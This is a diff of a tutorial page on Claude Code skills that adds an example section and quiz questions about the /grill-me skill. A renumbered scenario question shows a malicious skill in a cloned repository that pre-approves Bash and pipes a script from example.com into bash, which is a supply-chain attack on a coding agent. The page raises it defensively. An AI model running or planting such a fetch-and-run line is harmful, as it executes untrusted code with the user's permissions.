@@ -1015,7 +1015,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
   <li><a href="#controlling-who-can-run-a-skill" id="toc-controlling-who-can-run-a-skill" class="nav-link" data-scroll-target="#controlling-who-can-run-a-skill"><span class="header-section-number">56.5</span> Controlling who can run a skill</a></li>
   <li><a href="#bundled-skills-and-the-skills-menu" id="toc-bundled-skills-and-the-skills-menu" class="nav-link" data-scroll-target="#bundled-skills-and-the-skills-menu"><span class="header-section-number">56.6</span> Bundled skills and the /skills menu</a></li>
   <li><a href="#sharing-skills-and-trusting-other-peoples-skills" id="toc-sharing-skills-and-trusting-other-peoples-skills" class="nav-link" data-scroll-target="#sharing-skills-and-trusting-other-peoples-skills"><span class="header-section-number">56.7</span> Sharing skills, and trusting other people’s skills</a></li>
-  <li><a href="#key-takeaways" id="toc-key-takeaways" class="nav-link" data-scroll-target="#key-takeaways"><span class="header-section-number">56.8</span> Key takeaways</a></li>
+  <li><a href="#example-matt-pococks-skill-repository-and-grill-me" id="toc-example-matt-pococks-skill-repository-and-grill-me" class="nav-link" data-scroll-target="#example-matt-pococks-skill-repository-and-grill-me"><span class="header-section-number">56.8</span> Example: Matt Pocock’s skill repository and /grill-me</a></li>
+  <li><a href="#key-takeaways" id="toc-key-takeaways" class="nav-link" data-scroll-target="#key-takeaways"><span class="header-section-number">56.9</span> Key takeaways</a></li>
   <li><a href="#practice-questions" id="toc-practice-questions" class="nav-link" data-scroll-target="#practice-questions">Practice Questions</a>
   <ul class="collapse">
   <li><a href="#easy" id="toc-easy" class="nav-link" data-scroll-target="#easy">Easy</a></li>
@@ -1284,6 +1285,20 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <li>Its <code>allowed-tools</code> setting can <strong>pre-approve tools</strong>, so Claude can use them without asking you while the skill runs. The docs warn that this works even in a folder you haven’t trusted, so review the skills inside any repository you clone before you run Claude Code there.</li>
 </ul>
 <p>Read the <code>SKILL.md</code> and any scripts before you install or use a skill, and prefer skills from sources you trust.</p>
+</section>
+<section id="example-matt-pococks-skill-repository-and-grill-me" class="level2" data-number="56.8">
+<h2 data-number="56.8" class="anchored" data-anchor-id="example-matt-pococks-skill-repository-and-grill-me"><span class="header-section-number">56.8</span> Example: Matt Pocock’s skill repository and /grill-me</h2>
+<p>Many developers publish their skills on GitHub for anyone to use. A popular example is <a href="https://github.com/mattpocock/skills">Matt Pocock’s skill repository</a>, “Skills for Real Engineers”: a collection of small skills he uses every day, grouped into folders such as <code>engineering</code> and <code>productivity</code>. Each skill is an ordinary folder with a <code>SKILL.md</code>, so you can read exactly what it does before you install it, as with any skill from someone else.</p>
+<p>One of the best known is <strong><code>/grill-me</code></strong>. Instead of having Claude start writing code (or a plan) right away, it makes Claude <strong>interview you</strong> about your idea, in rounds of questions, until the idea is clear enough to commit to. You start it in a fresh conversation, then describe your idea:</p>
+<pre class="text"><code>/grill-me I want you to help me plan an app where students can swap used textbooks</code></pre>
+<p>Claude then asks questions such as: Who are the users? How do they pay? What happens if a book never arrives? Each round asks only questions whose prerequisites you have already answered. The skill writes no files; the result is a clearer idea in your own head (and in the conversation).</p>
+<p>A few things to notice:</p>
+<ul>
+<li>Its <code>SKILL.md</code> sets <code>disable-model-invocation: true</code>, so Claude never starts it on its own: only you can, by typing <code>/grill-me</code>.</li>
+<li><strong>You</strong> still own the decisions. Answering “agreed, agreed, agreed” to forty questions produces a plan that Claude wrote and you nodded at. Push back, say “I don’t know”, and steer.</li>
+<li>Some questions can’t be answered by talking (“how should this screen feel?”). For those, build a quick throwaway version and look at it.</li>
+</ul>
+<p>The repository’s README shows how to install the skills (in Claude Code, as a <a href="./070800-plugins-v001.html">plugin</a>). Installing a skill collection is installing someone else’s code: read the skills first.</p>
 <div class="callout callout-style-default callout-note callout-titled">
 <div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-1-contents" aria-controls="callout-1" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1298,27 +1313,27 @@ Deeper dive: Arguments and live data in a skill
 <div class="callout-body-container callout-body">
 <p><span class="yr-asof">As of Oct 6, 2026 · Official docs: <a href="https://code.claude.com/docs/en/skills#pass-arguments-to-skills">Skills: pass arguments</a> · <a href="https://code.claude.com/docs/en/skills#inject-dynamic-context">Skills: inject dynamic context</a></span></p>
 <p>This skill (saved as <code>.claude/skills/commit-message/SKILL.md</code> in a project) drafts a commit message for your staged Git changes:</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
-<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="an">name:</span><span class="co"> commit-message</span></span>
-<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="an">description:</span><span class="co"> Drafts a commit message for the staged Git changes</span></span>
-<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="an">disable-model-invocation:</span><span class="co"> true</span></span>
-<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
-<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="fu">## Staged changes</span></span>
-<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>!<span class="in">`git diff --staged`</span></span>
-<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="fu">## Your task</span></span>
-<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>Write a commit message for the staged changes above:</span>
-<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>First line: a summary of at most 60 characters, starting with a verb such as "Add" or "Fix"</span>
-<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>Then a blank line and 2-3 bullet points explaining what changed and why</span>
-<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>Extra context from the user (may be empty): $ARGUMENTS</span>
-<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a>If there are no staged changes, say so and stop.</span>
-<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a>Show the message only. Do not run git commit.</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="an">name:</span><span class="co"> commit-message</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="an">description:</span><span class="co"> Drafts a commit message for the staged Git changes</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="an">disable-model-invocation:</span><span class="co"> true</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="fu">## Staged changes</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>!<span class="in">`git diff --staged`</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="fu">## Your task</span></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>Write a commit message for the staged changes above:</span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>First line: a summary of at most 60 characters, starting with a verb such as "Add" or "Fix"</span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>Then a blank line and 2-3 bullet points explaining what changed and why</span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>Extra context from the user (may be empty): $ARGUMENTS</span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a>If there are no staged changes, say so and stop.</span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a>Show the message only. Do not run git commit.</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
 <ul>
 <li>The line <code>!`git diff --staged`</code> is <strong>dynamic context injection</strong>: Claude Code runs the command first and pastes its output into the instructions, so Claude sees your real changes. Claude Code checks such commands against your permission rules (read-only commands such as <code>git diff</code> pass). If the command fails, for example outside a Git repository, the skill doesn’t run.</li>
 <li><code>$ARGUMENTS</code> is replaced by whatever you type after the name: <code>/commit-message fixes the login bug</code>. If a skill has no placeholder, Claude Code adds your text at the end as <code>ARGUMENTS: ...</code>. <code>$0</code>, <code>$1</code>, … give individual arguments.</li>
@@ -1394,14 +1409,15 @@ Deeper dive: Skills in the Claude apps
 </div>
 </div>
 </section>
-<section id="key-takeaways" class="level2" data-number="56.8">
-<h2 data-number="56.8" class="anchored" data-anchor-id="key-takeaways"><span class="header-section-number">56.8</span> Key takeaways</h2>
+<section id="key-takeaways" class="level2" data-number="56.9">
+<h2 data-number="56.9" class="anchored" data-anchor-id="key-takeaways"><span class="header-section-number">56.9</span> Key takeaways</h2>
 <ul>
 <li>A skill is a folder with a <code>SKILL.md</code>: YAML frontmatter (<code>name</code>, <code>description</code>) plus Markdown instructions, and optional supporting files.</li>
 <li>Claude loads a skill when your request matches its description, or you run it with <code>/name</code>. Only the name and description cost context until it is used.</li>
 <li>Personal skills live in <code>~/.claude/skills/</code>, project skills in <code>.claude/skills/</code>.</li>
 <li>Use <code>disable-model-invocation: true</code> for skills with side effects.</li>
 <li>Treat other people’s skills like code: read them before you use them.</li>
+<li>Skill collections such as Matt Pocock’s are shared on GitHub; his <code>/grill-me</code> makes Claude interview you about an idea before any code is written.</li>
 </ul>
 </section>
 <section id="practice-questions" class="level2 unnumbered">
@@ -1555,7 +1571,7 @@ Suggested answer
 </div>
 <div id="callout-10" class="callout-10-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
-<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> ~/.claude/skills/meeting-notes</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> ~/.claude/skills/meeting-notes</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
 <p>The file is <code>C:\Users\sam\.claude\skills\meeting-notes\SKILL.md</code> (in Git Bash: <code>/c/Users/sam/.claude/skills/meeting-notes/SKILL.md</code>).</p>
 </div>
 </div>
@@ -1564,11 +1580,11 @@ Suggested answer
 <section id="question-8-find-the-bug" class="level4 unnumbered unlisted">
 <h4 class="unnumbered unlisted anchored" data-anchor-id="question-8-find-the-bug">Question 8 · Find the bug</h4>
 <p>Maria’s skill never shows its description and Claude never uses it on its own. Here is the start of her <code>SKILL.md</code>. What is wrong?</p>
-<div class="sourceCode" id="cb8"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>My review skill</span>
-<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>---</span>
-<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>name: review-checklist</span>
-<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>description: Reviews code against our team checklist. Use when the user asks for a review.</span>
-<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>---</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb9"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>My review skill</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>name: review-checklist</span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>description: Reviews code against our team checklist. Use when the user asks for a review.</span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>---</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
 <div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
 <div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-11-contents" aria-controls="callout-11" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1589,11 +1605,11 @@ Suggested answer
 <section id="question-9-find-the-bug" class="level4 unnumbered unlisted">
 <h4 class="unnumbered unlisted anchored" data-anchor-id="question-9-find-the-bug">Question 9 · Find the bug</h4>
 <p>This <code>/deploy</code> skill was supposed to run only when a person types <code>/deploy</code>, but Claude started it on its own. Why?</p>
-<div class="sourceCode" id="cb9"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
-<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="an">name:</span><span class="co"> deploy</span></span>
-<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="an">description:</span><span class="co"> Deploy the application to production</span></span>
-<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="an">disable_model_invocation:</span><span class="co"> true</span></span>
-<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb10"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="an">name:</span><span class="co"> deploy</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="an">description:</span><span class="co"> Deploy the application to production</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="an">disable_model_invocation:</span><span class="co"> true</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
 <div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
 <div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-12-contents" aria-controls="callout-12" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1718,12 +1734,9 @@ Suggested answer
 </div>
 </div>
 </section>
-</section>
-<section id="hard" class="level3 unnumbered">
-<h3 class="unnumbered anchored" data-anchor-id="hard">Hard</h3>
-<section id="question-15-compare" class="level4 unnumbered unlisted">
-<h4 class="unnumbered unlisted anchored" data-anchor-id="question-15-compare">Question 15 · Compare</h4>
-<p>For each item, decide whether it belongs in CLAUDE.md or in a skill, and explain why: (a) “Use pnpm, not npm.” (b) A 150-line API style guide that matters only when writing API endpoints. (c) A release checklist you run by hand before each release.</p>
+<section id="question-15-multiple-choice" class="level4 unnumbered unlisted">
+<h4 class="unnumbered unlisted anchored" data-anchor-id="question-15-multiple-choice">Question 15 · Multiple choice</h4>
+<p>You type <code>/grill-me I want you to help me plan a booking app for a hair salon</code>. What does the <code>grill-me</code> skill make Claude do? a. Write the code for the app right away b. Interview you, in rounds of questions, until the idea is clear enough to commit to c.&nbsp;Criticize your existing code and list its bugs d.&nbsp;Search the web for similar apps</p>
 <div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
 <div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-18-contents" aria-controls="callout-18" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1736,17 +1749,14 @@ Suggested answer
 </div>
 <div id="callout-18" class="callout-18-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
-<ol type="a">
-<li><strong>CLAUDE.md</strong>: a short rule Claude should always know, in every session.</li>
-<li><strong>Skill</strong> (reference content): it is long and needed only sometimes, so loading it on demand saves context. (c) <strong>Skill</strong> (task content) with <code>disable-model-invocation: true</code>: a workflow you trigger with <code>/release</code> when <em>you</em> decide.</li>
-</ol>
+<p><strong>b.</strong> <code>/grill-me</code> (from Matt Pocock’s skill repository) makes Claude ask you questions about your idea, round by round, before anything is built. It writes no code and no files; the result is a clearer idea.</p>
 </div>
 </div>
 </div>
 </section>
-<section id="question-16-scenario" class="level4 unnumbered unlisted">
-<h4 class="unnumbered unlisted anchored" data-anchor-id="question-16-scenario">Question 16 · Scenario</h4>
-<p>You clone a public repository. It contains <code>.claude/skills/setup/SKILL.md</code> with <code>allowed-tools: Bash</code> in its frontmatter and the line <code>!`curl -s https://example.com/install.sh | bash`</code> in its body. What could go wrong, and what should you do before running Claude Code in that folder?</p>
+<section id="question-16-short-answer" class="level4 unnumbered unlisted">
+<h4 class="unnumbered unlisted anchored" data-anchor-id="question-16-short-answer">Question 16 · Short answer</h4>
+<p>The <code>grill-me</code> skill’s frontmatter contains <code>disable-model-invocation: true</code>. What does that mean for how the skill is used, and why does it make sense for this skill?</p>
 <div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
 <div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-19-contents" aria-controls="callout-19" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1759,14 +1769,17 @@ Suggested answer
 </div>
 <div id="callout-19" class="callout-19-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
-<p><code>allowed-tools: Bash</code> would let Claude run shell commands without asking you while the skill runs, and the <code>!</code> line would make Claude Code download and run a script from the internet as soon as the skill starts. A malicious repository could use this to run any command on your computer with your permissions. The docs warn that <code>allowed-tools</code> applies even in a folder you haven’t trusted. Before running Claude Code there, read the repository’s <code>.claude/</code> folder (skills, settings, hooks) and remove anything you don’t understand. To look around first without loading any of the repository’s customizations, you can start Claude Code with <code>claude --safe-mode</code>, which loads no skills, hooks, MCP servers, or plugins.</p>
+<p>Claude will never start the skill on its own; it runs only when you type <code>/grill-me</code>. That makes sense because a long interview is something you choose to start when you have an idea to think through, not something Claude should spring on you in the middle of other work.</p>
 </div>
 </div>
 </div>
 </section>
+</section>
+<section id="hard" class="level3 unnumbered">
+<h3 class="unnumbered anchored" data-anchor-id="hard">Hard</h3>
 <section id="question-17-compare" class="level4 unnumbered unlisted">
 <h4 class="unnumbered unlisted anchored" data-anchor-id="question-17-compare">Question 17 · Compare</h4>
-<p>Compare <code>disable-model-invocation: true</code> and <code>user-invocable: false</code>. Which one removes the skill’s description from Claude’s context, and why does that matter?</p>
+<p>For each item, decide whether it belongs in CLAUDE.md or in a skill, and explain why: (a) “Use pnpm, not npm.” (b) A 150-line API style guide that matters only when writing API endpoints. (c) A release checklist you run by hand before each release.</p>
 <div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
 <div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-20-contents" aria-controls="callout-20" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1779,14 +1792,17 @@ Suggested answer
 </div>
 <div id="callout-20" class="callout-20-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
-<p><code>disable-model-invocation: true</code> means only you can run the skill; its description is <strong>not</strong> in Claude’s context. <code>user-invocable: false</code> means only Claude can run it; it is hidden from the <code>/</code> menu, but its description <strong>stays</strong> in context so Claude knows when to use it. Removing the description saves context in every session, and it also guarantees that Claude cannot start a skill with side effects by itself.</p>
+<ol type="a">
+<li><strong>CLAUDE.md</strong>: a short rule Claude should always know, in every session.</li>
+<li><strong>Skill</strong> (reference content): it is long and needed only sometimes, so loading it on demand saves context. (c) <strong>Skill</strong> (task content) with <code>disable-model-invocation: true</code>: a workflow you trigger with <code>/release</code> when <em>you</em> decide.</li>
+</ol>
 </div>
 </div>
 </div>
 </section>
-<section id="question-18-long-answer" class="level4 unnumbered unlisted">
-<h4 class="unnumbered unlisted anchored" data-anchor-id="question-18-long-answer">Question 18 · Long answer</h4>
-<p>Design a skill named <code>weekly-status</code> that drafts a short status update for your team project from recent Git history. Write its frontmatter and an outline of its instructions, and justify your choice of who can run it.</p>
+<section id="question-18-scenario" class="level4 unnumbered unlisted">
+<h4 class="unnumbered unlisted anchored" data-anchor-id="question-18-scenario">Question 18 · Scenario</h4>
+<p>You clone a public repository. It contains <code>.claude/skills/setup/SKILL.md</code> with <code>allowed-tools: Bash</code> in its frontmatter and the line <code>!`curl -s https://example.com/install.sh | bash`</code> in its body. What could go wrong, and what should you do before running Claude Code in that folder?</p>
 <div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
 <div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-21-contents" aria-controls="callout-21" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1799,29 +1815,14 @@ Suggested answer
 </div>
 <div id="callout-21" class="callout-21-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
-<p>One good design:</p>
-<div class="sourceCode" id="cb10"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
-<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="an">name:</span><span class="co"> weekly-status</span></span>
-<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="an">description:</span><span class="co"> Drafts a weekly status update from the last week of Git commits</span></span>
-<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="an">disable-model-invocation:</span><span class="co"> true</span></span>
-<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
-<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="fu">## Recent commits</span></span>
-<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>!<span class="in">`git log --since="1 week ago" --oneline`</span></span>
-<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="fu">## Your task</span></span>
-<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a>Write a status update with three headings: Done, In progress, Blockers.</span>
-<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a>Use plain language for a non-technical reader and at most 150 words.</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
-<p><code>disable-model-invocation: true</code> fits because you decide when a status update is needed; Claude shouldn’t produce one unprompted. A good answer has a valid frontmatter (first line <code>---</code>, lowercase hyphenated <code>name</code> matching the folder, a clear <code>description</code>), concrete instructions, and a reason for the invocation choice. (The <code>!</code> line is optional; it pulls in live data, and <code>git log</code> is a read-only command.)</p>
+<p><code>allowed-tools: Bash</code> would let Claude run shell commands without asking you while the skill runs, and the <code>!</code> line would make Claude Code download and run a script from the internet as soon as the skill starts. A malicious repository could use this to run any command on your computer with your permissions. The docs warn that <code>allowed-tools</code> applies even in a folder you haven’t trusted. Before running Claude Code there, read the repository’s <code>.claude/</code> folder (skills, settings, hooks) and remove anything you don’t understand. To look around first without loading any of the repository’s customizations, you can start Claude Code with <code>claude --safe-mode</code>, which loads no skills, hooks, MCP servers, or plugins.</p>
 </div>
 </div>
 </div>
 </section>
-<section id="question-19-scenario" class="level4 unnumbered unlisted">
-<h4 class="unnumbered unlisted anchored" data-anchor-id="question-19-scenario">Question 19 · Scenario</h4>
-<p>Sam has written 30 personal skills with long, overlapping descriptions. Claude now often picks the wrong one. Give three concrete fixes based on this page.</p>
+<section id="question-19-compare" class="level4 unnumbered unlisted">
+<h4 class="unnumbered unlisted anchored" data-anchor-id="question-19-compare">Question 19 · Compare</h4>
+<p>Compare <code>disable-model-invocation: true</code> and <code>user-invocable: false</code>. Which one removes the skill’s description from Claude’s context, and why does that matter?</p>
 <div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
 <div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-22-contents" aria-controls="callout-22" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1833,6 +1834,61 @@ Suggested answer
 <div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
 </div>
 <div id="callout-22" class="callout-22-contents callout-collapse collapse">
+<div class="callout-body-container callout-body">
+<p><code>disable-model-invocation: true</code> means only you can run the skill; its description is <strong>not</strong> in Claude’s context. <code>user-invocable: false</code> means only Claude can run it; it is hidden from the <code>/</code> menu, but its description <strong>stays</strong> in context so Claude knows when to use it. Removing the description saves context in every session, and it also guarantees that Claude cannot start a skill with side effects by itself.</p>
+</div>
+</div>
+</div>
+</section>
+<section id="question-20-long-answer" class="level4 unnumbered unlisted">
+<h4 class="unnumbered unlisted anchored" data-anchor-id="question-20-long-answer">Question 20 · Long answer</h4>
+<p>Design a skill named <code>weekly-status</code> that drafts a short status update for your team project from recent Git history. Write its frontmatter and an outline of its instructions, and justify your choice of who can run it.</p>
+<div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
+<div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-23-contents" aria-controls="callout-23" aria-expanded="false" aria-label="Toggle callout">
+<div class="callout-icon-container">
+<i class="callout-icon no-icon"></i>
+</div>
+<div class="callout-title-container flex-fill">
+Suggested answer
+</div>
+<div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
+</div>
+<div id="callout-23" class="callout-23-contents callout-collapse collapse">
+<div class="callout-body-container callout-body">
+<p>One good design:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="an">name:</span><span class="co"> weekly-status</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="an">description:</span><span class="co"> Drafts a weekly status update from the last week of Git commits</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="an">disable-model-invocation:</span><span class="co"> true</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a><span class="fu">## Recent commits</span></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>!<span class="in">`git log --since="1 week ago" --oneline`</span></span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a><span class="fu">## Your task</span></span>
